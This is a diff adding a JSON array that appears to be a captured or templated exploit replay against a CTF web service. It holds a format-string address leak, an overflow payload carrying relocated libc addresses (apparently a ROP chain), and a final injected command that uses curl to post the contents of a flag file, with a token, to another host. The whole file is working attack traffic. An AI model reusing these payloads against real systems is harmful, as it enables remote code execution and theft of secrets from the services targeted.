@@ -1,0 +1,8 @@
+[
+    "1Who {{{HEAP_BASE:94322:3:ORI:4:0x752072}}}?\\n", 
+    "0%31$p\\n", 
+    "1welcome!0x{{{LIBC_BASE:133168:12:HEX:10:0x7f6959710830}}}", 
+    "0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00{{{LIBC_BASE:135426:8:ORI:72:0x7f6959711102}}}{{{LIBC_BASE:1625431:8:ORI:80:0x7f695987cd57}}}{{{LIBC_BASE:283536:8:ORI:88:0x7f6959735390}}}\\n", 
+    "1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x01HTTP/1.1 404 {{{HEAP_BASE:48974:3:ORI:188:0x746f4e}}} {{{HEAP_BASE:114502:3:ORI:192:0x756f46}}}nd\\r\\nC{{{HEAP_BASE:48751:3:ORI:130:0x746e6f}}}{{{HEAP_BASE:48741:3:ORI:133:0x746e65}}}-Type{{{HEAP_BASE:28730:3:ORI:101:0x74203a}}}{{{HEAP_BASE:51301:3:ORI:104:0x747865}}}{{{HEAP_BASE:47151:3:ORI:107:0x74682f}}}ml; char{{{HEAP_BASE:46451:3:ORI:118:0x746573}}}=UTF-8\\r\\nC{{{HEAP_BASE:48751:3:ORI:130:0x746e6f}}}{{{HEAP_BASE:48741:3:ORI:133:0x746e65}}}-Le{{{HEAP_BASE:46958:3:ORI:139:0x74676e}}}h: 23\\r\\nServer: EasyServer (L{{{HEAP_BASE:114281:3:ORI:170:0x756e69}}}x)\\r\\n\\r\\n<h3>Page {{{HEAP_BASE:48974:3:ORI:188:0x746f4e}}} {{{HEAP_BASE:114502:3:ORI:192:0x756f46}}}nd</h3>", 
+    "0curl{{{HEAP_BASE:47136:3:ORI:4:0x746820}}}tp://10.0.0.2/api/flag{{{HEAP_BASE:115503:3:ORI:29:0x75732f}}}b{{{HEAP_BASE:47469:3:ORI:33:0x74696d}}} --{{{HEAP_BASE:45412:3:ORI:39:0x746164}}}a \"flag=`{{{HEAP_BASE:45411:3:ORI:51:0x746163}}} /flags/fake-cgi/flag{{{HEAP_BASE:30304:3:ORI:75:0x742660}}}oken=aXVY498k\"\\n"
+]
